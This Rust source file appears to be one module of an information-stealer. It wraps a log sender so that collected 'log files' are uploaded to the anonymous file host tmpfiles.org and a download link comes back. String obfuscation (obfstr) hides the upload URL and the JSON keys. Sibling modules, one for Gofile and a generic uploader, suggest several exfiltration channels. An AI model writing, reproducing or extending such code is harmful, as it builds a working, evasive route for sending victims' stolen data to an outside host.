use crate::external_upload::{base_upload, Uploader};
use crate::gofile::GofileSender;
use crate::{LogContent, LogFile, LogSender, SendError};
use alloc::string::String;
use collector::Collector;
use delegate::delegate;
use derive_new::new;
use json::parse;
use obfstr::obfstr as s;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};

/// https://tmpfiles.org uploader wrapper around an inner [`LogSender`].
///
/// # Take into account
/// - The maximum supported log file size is **100 MB**.
/// - Uploaded files will be automatically **deleted 60 minutes** after upload.
#[derive(Clone)]
pub struct TmpFiles<T: LogSender> {
    inner: Uploader<T>
}

impl<T: LogSender> TmpFiles<T> {
    pub fn new(inner: T) -> Self {
        Self {
            inner: Uploader::new(inner, upload)
        }
    }
}

fn upload(name: &str, bytes: &[u8]) -> Option<String> {
    let response = base_upload(name, s!("https://tmpfiles.org/api/v1/upload"), bytes)?;

    Some(
        parse(response.body())
            .ok()?
            .get(s!("data"))?
            .get(s!("downloadPage"))?
            .as_string()?
            .clone(),
    )
}

impl<T: LogSender> LogSender for TmpFiles<T> {
    delegate! {
        to self.inner {
            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
            where P: AsRef<str> + Clone, C: Collector;
        }
    }
}